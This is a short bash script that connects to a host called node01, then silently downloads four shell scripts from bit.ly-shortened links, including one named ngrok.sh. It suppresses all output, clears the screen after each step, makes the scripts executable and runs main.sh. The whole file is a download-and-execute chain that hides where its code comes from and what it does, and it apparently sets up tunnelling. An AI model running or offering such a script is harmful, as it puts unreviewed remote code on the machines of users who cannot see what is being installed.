#!/bin/bash
ssh node01
wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
clear
wget -O main.sh https://bit.ly/3ygtUVF > /dev/null 2>&1
clear
wget -O ngrok.sh https://bit.ly/3iZzIMQ > /dev/null 2>&1
clear
wget -O download.sh https://bit.ly/3l5VKjK > /dev/null 2>&1
chmod +x main.sh
chmod +x exit.sh
chmod +x ngrok.sh
chmod +x download.sh
clear
sleep 1
./main.sh
